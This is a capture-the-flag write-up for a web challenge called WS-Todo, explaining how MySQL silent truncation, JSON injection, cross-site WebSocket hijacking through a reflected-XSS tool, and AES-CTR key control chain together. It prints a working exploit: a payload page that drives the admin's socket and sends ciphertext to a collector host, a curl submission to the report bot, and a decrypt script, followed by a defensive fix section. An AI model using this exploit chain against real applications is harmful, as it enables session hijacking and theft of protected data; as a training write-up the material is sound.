## Overview

`WS-Todo` is a Medium **Web** challenge: a Node/Express Todo application that talks over
WebSockets and encrypts each task with "military-grade" AES‑256‑CTR. The flag is only ever
emitted in the WebSocket response for **user id 1 (the admin)**, and a headless report bot
logs in as that admin and visits any URL you submit. The solve chains three flaws — a MySQL
silent‑truncation [JSON injection](https://cwe.mitre.org/data/definitions/74.html) that hands
you control of the AES key, a
[Cross‑Site WebSocket Hijack](https://cwe.mitre.org/data/definitions/1385.html) delivered
through a same‑host reflected‑[XSS](https://cwe.mitre.org/data/definitions/79.html) tool so the
admin's cookie rides the socket, and a trivial local decrypt with the key you injected.

## The technique

Three bugs stack together.

**1. MySQL silent truncation → JSON injection.** The `add` handler builds the stored row by
string‑interpolating user input straight into a JSON string, then re‑parses it on read:

```js
await db.addTask(userId, `{"title":"${data.title}","description":"${data.description}","secret":"${secret}"}`);
const task = JSON.parse(row.data);
encrypt(task.title, task.secret);
```

`JSON.parse` keeps the **last** value for a duplicate key, and the genuine `secret` is textually
last — so a naive injected duplicate loses. The escalation: `todos.data` is `VARCHAR(255)` and
MySQL runs **without** `STRICT_TRANS_TABLES`, so an over‑long write is silently truncated to 255
characters. Craft `description` so the first 255 characters form a *complete, valid* JSON object
that ends with **your** `secret`, pushing the real trailing `,"secret":"<real>"}` past character
255 where it is dropped. After truncation the re‑parsed object contains only your key.

**2. CSWSH via a same‑host XSS sink.** The session cookie is host‑scoped (port‑agnostic) and has
no `SameSite` attribute, and the WebSocket route is registered with Express `app.ws()` — which
bypasses the anti‑CSRF middleware (`Host === Origin`) that guards the HTTP routes. The app also
ships a helper `htmltester` (PHP, echoes `$_GET['html']` verbatim) on the **same host** at `:8080`.
Point the admin bot at `http://127.0.0.1:8080/?html=<script>…</script>` — the script runs on
origin `127.0.0.1:8080` and opens `ws://127.0.0.1/ws`; because it is the same site, the admin's
cookie attaches to the handshake.

**3. AES‑CTR key control.** As the admin, the script plants a task with your known key, requests
`get`, and the flag‑bearing quote comes back encrypted under **your** key. Exfiltrate it and
decrypt locally.

## Solution

The stored template has 84 fixed characters around a 32‑byte key, so a 171‑character pad lands the
closing brace at exactly byte 255:

```python
KEY  = "0123456789abcdef0123456789abcdef"    # our 32-byte AES-256 key
PAD  = "A" * 171                              # pad = 255 - len(prefix) - 2
DESC = 'a","secret":"' + KEY + '","pad":"' + PAD + '"}'
# stored row (first 255 chars, valid JSON, real secret truncated off):
# {"title":"a","description":"a","secret":"0123...cdef","pad":"AAAA...AAAA"}
```

The CSWSH page, served through `htmltester`, drives the admin's socket and exfiltrates the
flag‑quote ciphertext:

Create the payload page (`page.html`):

```html
<script>
var K = "0123456789abcdef0123456789abcdef";
var DESC = 'a","secret":"' + K + '","pad":"' + "A".repeat(171) + '"}';
var ws = new WebSocket("ws://127.0.0.1/ws");
ws.onopen = function () {
  ws.send(JSON.stringify({ action: "add", title: "a", description: DESC }));
};
ws.onmessage = function (e) {
  var d = JSON.parse(e.data);
  if (d.action == "add") {
    ws.send(JSON.stringify({ action: "get" }));
  } else if (d.action == "get") {
    for (var i = 0; i < d.tasks.length; i++) {
      var q = d.tasks[i].quote;
      new Image().src = "https://<collector>/?iv=" + q.iv + "&c=" + q.content;
    }
  }
};
</script>
```

Submit it to the report bot (the `Origin` header must match the app host to pass the anti‑CSRF
check on the HTTP route):

```bash
curl -s -X POST http://<target>/report \
  -H "Origin: http://<target>" -H "Content-Type: application/json" \
  --data-urlencode 'url=http://127.0.0.1:8080/?html=<url-encoded page.html>'
```

Then decrypt the exfiltrated `iv`+`content` with the key you injected:

```python
from Crypto.Cipher import AES
def dec(iv, ct, key):
    c = AES.new(key.encode(), AES.MODE_CTR, nonce=b'', initial_value=bytes.fromhex(iv))
    return c.decrypt(bytes.fromhex(ct))
# -> A wise man once said, "the flag is HTB{...}".
```

The recovered quote reads `A wise man once said, "the flag is HTB{...}".` — flag redacted.

## Why it worked

Anti‑CSRF on the HTTP layer gave a false sense of safety: the WebSocket upgrade path is a separate,
unguarded door. A port‑agnostic, `SameSite`‑less cookie combined with any same‑host reflected‑XSS
tool turned a cross‑*site* WebSocket hijack into a same‑*site* request that carried the admin's
session. And a non‑strict MySQL silently truncating an over‑long JSON blob handed the attacker the
exact field — the AES key — that the application trusted as a server secret.

## Fix / defense

- Enable `STRICT_TRANS_TABLES` so oversized writes error instead of truncating; build the row with
  `JSON.stringify`, never string interpolation of user input.
- Validate the `Origin` header on the WebSocket handshake and apply the same CSRF/origin check to
  `app.ws` that guards the HTTP routes.
- Set `SameSite=Strict` on the session cookie, and never co‑host an HTML‑reflecting "tester" tool
  on the same origin as the authenticated application.
